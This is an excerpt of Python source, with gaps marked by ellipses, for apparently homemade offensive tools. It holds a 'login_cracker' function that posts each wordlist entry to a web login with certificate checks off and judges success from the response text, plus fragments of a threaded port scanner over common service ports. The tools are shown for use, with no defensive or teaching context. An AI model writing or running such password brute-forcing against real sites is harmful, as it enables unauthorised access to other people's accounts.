...
def login_cracker(url, user_name = "", word_list = "", secure = True):
    ...
    with open(word_list, "r") as f:
        for i in f:
            ...
            try:
                verify = web_session.post(my_url, data = payload, verify = False, headers = user_agent, timeout = (5, 30)).text

                if "password" not in verify.lower() and "login" not in verify.lower():
                    print("True: " + key)
                    break

                if "password" in verify.lower() or "login" in verify.lower():
                    print("False: "+ key)
...
def nmap():
    ...
    port_list = [20,21,22,53,67,68,80,443,853,8080,8443]
...
def nmap_thread(port, i, ii, iii, iv):
    ...
    port_dict = {20:"ftp data",21:"ftp command",22:"ssh",53:"dns",67:"dhcp",68:"dhcp",80:"http",443:"https",853:"dns over tls",8080:"http proxy",8443:"https proxy"}
